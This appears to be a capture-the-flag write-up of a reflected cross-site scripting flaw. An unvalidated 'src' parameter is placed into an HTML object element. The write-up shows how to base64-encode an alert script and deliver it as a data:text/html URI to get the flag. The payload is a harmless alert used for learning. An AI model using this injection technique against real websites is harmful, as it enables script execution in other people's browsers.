## Reflected Cross Site Scripting (XSS)

# Vulnerability
* See `http://[host]/?page=media&src=nsa`
* Modify `src` parameter
* See that it updates without validation an `<object>` element (The HTML 
<object> element represents an external resource, which can be treated as an 
image, a nested browsing context, or a resource to be handled by a plugin.)
```
<object data="[input]"></object>
```
* Base64 encode a malicious script
```
echo -e "<script>alert('42')</script>" | base64
```
It outputs `PHNjcmlwdD5hbGVydCgnNDInKTwvc2NyaXB0Pgo=`
* Visit `http://[host]/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnNDInKTwvc2NyaXB0Pgo=`
* Get the flag

# Attack

# Reference
https://owasp.org/www-community/attacks/xss/
